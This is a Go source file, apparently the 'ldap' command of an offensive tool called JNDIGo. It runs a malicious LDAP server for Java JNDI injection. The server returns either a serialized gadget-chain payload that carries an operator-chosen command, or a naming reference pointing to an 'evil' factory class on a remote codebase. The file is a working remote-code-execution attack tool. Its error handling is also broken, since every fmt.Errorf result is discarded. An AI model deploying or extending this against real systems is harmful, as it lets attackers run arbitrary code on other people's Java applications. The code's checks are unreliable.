package cmd

import (
	"fmt"
	gososerial "github.com/EmYiQing/Gososerial"
	"github.com/ekixu/JNDIGo/internal/server/ldap"
	"github.com/ekixu/JNDIGo/pkg/serialize"
	"github.com/spf13/cobra"
	"strconv"
)

var ldapCmd = &cobra.Command{
	Use:   "ldap host port [payload] [command/evilClassName] [--codebase] [-l]",
	Short: "This command will start ldap server",
	Long:  `This ldap command will start ldap server with your payload`,
	Args:  cobra.MinimumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		if show, _ := cmd.Flags().GetBool("list"); show {
			all := gososerial.GetAllNames()
			for _, v := range all {
				fmt.Printf("\t%s\n", v)
			}
			fmt.Printf("\t%s\n", "factory")
			return
		}

		host := args[0]
		port, err := strconv.Atoi(args[1])
		codebase, _ := cmd.Flags().GetString("codebase")

		if err != nil {
			fmt.Errorf("%+v", err)
		}
		if port < 0 || port > 0xffff {
			fmt.Errorf("invalid port number")
		}

		payloadAttribute := make(map[string]string, 4)

		payloadAttribute["javaClassName"] = "whatever"

		if len(codebase) > 0 {
			payloadAttribute["javaCodebase"] = codebase
		}

		if len(args) >= 4 {
			payload := args[2]
			command := args[3]
			if payload != "factory" {
				bytePayload, err := serialize.GetBytePayload(payload, command)
				if err != nil {
					fmt.Errorf("%+v", err)
				}
				payloadAttribute["javaSerializedData"] = string(bytePayload)
				payloadAttribute["objectClass"] = "whatever"
			} else {
				evilClassname := command
				payloadAttribute["objectClass"] = "javaNamingReference"
				payloadAttribute["JavaFactory"] = evilClassname
			}

		}

		ds := ldap.New(host, port, logger, payloadAttribute)

		ds.Run()
	},
}
